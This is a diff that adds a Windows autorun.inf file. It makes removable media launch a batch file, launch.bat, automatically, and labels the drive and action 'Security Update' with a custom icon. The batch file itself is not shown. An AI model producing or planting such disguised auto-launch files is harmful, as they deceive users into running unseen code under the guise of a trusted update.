@@ -1,0 +1,8 @@
+[AutoRun]
+open=launch.bat
+icon=icon.ico,0
+label=Security Update
+action=Install Security Update
+
+[Content]
+MUIVerb=Security Update
